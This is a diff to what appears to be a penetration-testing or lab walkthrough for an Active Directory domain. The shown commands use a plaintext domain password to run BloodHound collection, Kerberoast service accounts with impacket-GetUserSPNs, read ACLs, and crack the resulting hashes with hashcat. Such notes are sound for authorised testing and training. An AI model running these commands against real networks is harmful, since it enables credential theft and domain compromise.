@@ -37,8 +37,9 @@ bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.
 ```
 
 Direct LDAP equivalents:
-
-# SPN accounts (Kerberoasting candidates)
+Recon
+Kerberoasting
+## SPN accounts (Kerberoasting candidates)
 ```bash
 impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
 ```
@@ -50,7 +51,7 @@ impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.
 ### 3. Exploitation
 #### 3.1 Kerberoasting
 ```bash
-impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 \ -request -outputfile kerberoast_hashes.txt
+impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 -request -outputfile kerberoast_hashes.txt
 
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
